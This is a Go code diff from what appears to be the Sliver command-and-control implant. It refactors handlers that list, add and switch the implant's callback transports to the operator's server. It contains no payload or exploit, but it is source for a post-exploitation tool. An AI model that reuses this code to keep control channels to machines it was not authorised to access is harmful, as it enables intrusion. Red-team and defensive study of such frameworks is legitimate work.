@@ -80,18 +80,8 @@ func c2Handler(data []byte, resp handlers.RPCResponse) {
 	proto.Unmarshal(data, req)
 	res := &sliverpb.Transports{Response: &commonpb.Response{}}
 
-	for order, tp := range Transports.Available {
-		transport := &sliverpb.Transport{
-			ID:       tp.Profile.ID,
-			Order:    int32(order),
-			Running:  tp.Profile.Active,
-			Attempts: int32(tp.attempts),
-			Failures: int32(tp.failures),
-			Profile:  tp.Profile,
-		}
-		res.Transports = append(res.Transports, transport)
-	}
-
+	// Latest statistics for all loaded transports.
+	res.Transports = Transports.transportStatistics()
 	// Response
 	resData, err := proto.Marshal(res)
 	resp(resData, err)
@@ -103,7 +93,7 @@ func addTransportHandler(data []byte, resp handlers.RPCResponse) {
 	res := &sliverpb.TransportAdd{Response: &commonpb.Response{}}
 
 	// Instantiate the transport.
-	c2, err := NewMalleableFromProfile(req.Profile)
+	channel, err := InitChannelFromProfile(req.Profile)
 	if err != nil {
 		res.Success = false
 		res.Response.Err = err.Error()
@@ -111,10 +101,10 @@ func addTransportHandler(data []byte, resp handlers.RPCResponse) {
 		resp(data, err)
 		return
 	}
-	c2.Priority = int(req.Priority)
+	channel.Transport().Priority = int(req.Priority)
 
 	// Add to available c2, with the requested order
-	Transports.Add(c2)
+	Transports.Add(channel)
 	res.Success = true
 
 	// Response
@@ -123,7 +113,7 @@ func addTransportHandler(data []byte, resp handlers.RPCResponse) {
 
 	// Switch with the new, if asked to
 	if req.Switch {
-		err = Transports.Switch(c2.ID)
+		err = Transports.Switch(channel.Transport().ID)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("Transport switch error: %s", err.Error())
@@ -145,6 +135,10 @@ func deleteTransportHandler(data []byte, resp handlers.RPCResponse) {
 	resp(resData, err)
 }
 
+// transportSwitchHandler - This handler simply receives the transport switch request,
+// checks transport is loaded, and sends back success. Only then, it calls the Switch
+// implementation, because the latter WILL reach back to the server, either through
+// a new Channel (before cutting the old one) or through the old one, in case of failure.
 func transportSwitchHandler(data []byte, resp handlers.RPCResponse) {
 	req := &sliverpb.TransportSwitchReq{}
 	proto.Unmarshal(data, req)
@@ -163,7 +157,7 @@ func transportSwitchHandler(data []byte, resp handlers.RPCResponse) {
 	resData, err := proto.Marshal(res)
 	resp(resData, err)
 
-	err = Transports.Switch(tp.ID)
+	err = Transports.Switch(tp.Transport().ID)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Transport switch error: %s", err.Error())
